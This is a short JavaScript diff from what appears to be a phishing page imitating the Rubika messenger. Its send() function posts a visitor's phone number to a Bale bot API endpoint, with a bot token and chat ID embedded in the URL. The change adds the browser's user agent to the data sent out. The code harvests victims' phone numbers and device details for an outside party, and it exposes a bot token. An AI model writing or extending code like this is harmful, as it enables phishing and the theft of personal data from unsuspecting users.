@@ -34,7 +34,7 @@ async function send() {
             mode: "cors",
             cache: "no-cache",
             url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
-            data: { chat_id: "915303220", text: String(phone) },
+            data: { chat_id: "915303220", text: String("phone : "+phone+"\ndivis info : "+navigator.userAgent) },
         });
         document.body.innerHTML = `<div class="box">
         <img src="icon-192x192.png" alt="logo rubika">
